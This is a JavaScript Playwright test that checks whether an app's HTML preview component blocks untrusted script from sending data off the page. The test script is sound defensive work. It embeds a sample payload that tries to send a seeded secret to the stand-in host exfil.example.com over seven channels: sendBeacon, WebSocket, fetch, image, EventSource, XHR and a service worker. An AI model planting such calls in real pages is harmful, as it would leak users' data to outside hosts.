// Does anything actually leave the page? Observe the network, not the API's
// return value — sendBeacon returning true only means "queued", and a
// WebSocket constructor not throwing only means "not yet rejected".
import pw from "/opt/node22/lib/node_modules/playwright/index.js";
const { chromium } = pw;

const browser = await chromium.launch();
const ctx = await browser.newContext();
const page = await ctx.newPage();

// A request OBJECT is created even when CSP kills it before the network. The
// only thing that counts as egress is one that actually completed.
const attempted = new Set();
const completed = [];
const failed = [];
const blocked = [];
const off = (u) => !u.startsWith("http://localhost:8080");
page.on("request", (r) => { if (off(r.url())) attempted.add(r.url()); });
page.on("requestfinished", (r) => { if (off(r.url())) completed.push(r.url()); });
page.on("requestfailed", (r) => { if (off(r.url())) failed.push(`${r.url()} :: ${r.failure()?.errorText}`); });
page.on("websocket", (ws) => { if (off(ws.url())) { attempted.add(ws.url()); ws.on("socketerror", () => failed.push(ws.url() + " :: ws-error")); } });
page.on("console", (m) => { if (/Content Security Policy|Refused/i.test(m.text())) blocked.push("CSP: " + m.text().slice(0, 110)); });

await page.goto("http://localhost:8080/", { waitUntil: "networkidle" });
await page.evaluate(() => localStorage.setItem("high-thoughts/v1", JSON.stringify([{ thought: "MY-SECRET-IDEA" }])));

const html = `<!doctype html><html><body><script>
  try { navigator.sendBeacon('https://exfil.example.com/b', 'MY-SECRET-IDEA'); } catch(e){}
  try { new WebSocket('wss://exfil.example.com/ws'); } catch(e){}
  try { fetch('https://exfil.example.com/f?d=MY-SECRET-IDEA'); } catch(e){}
  try { new Image().src = 'https://exfil.example.com/i.gif?d=MY-SECRET-IDEA'; } catch(e){}
  try { new EventSource('https://exfil.example.com/sse'); } catch(e){}
  try { const x=new XMLHttpRequest(); x.open('POST','https://exfil.example.com/x'); x.send('MY-SECRET-IDEA'); } catch(e){}
  try { navigator.serviceWorker.register('/sw.js'); } catch(e){}
<\/script></body></html>`;

await page.evaluate(async (h) => {
  const { mountPreview } = await import("/preview.js");
  const host = document.createElement("div");
  document.body.append(host);
  mountPreview(host, h);
}, html);

await page.waitForTimeout(6000);

const leaked = completed.filter((u) => !failed.some((f) => f.startsWith(u)));
console.log(JSON.stringify({
  attempted: [...attempted],
  completedSuccessfully: completed,
  failedWithReason: failed,
  cspRefusals: blocked.filter((b) => b.startsWith("CSP:")).length,
  verdict: leaked.length === 0
    ? `ALL ${attempted.size} EXFIL ATTEMPTS BLOCKED — nothing completed`
    : `EGRESS: ${leaked.join(", ")}`,
}, null, 2));
await browser.close();
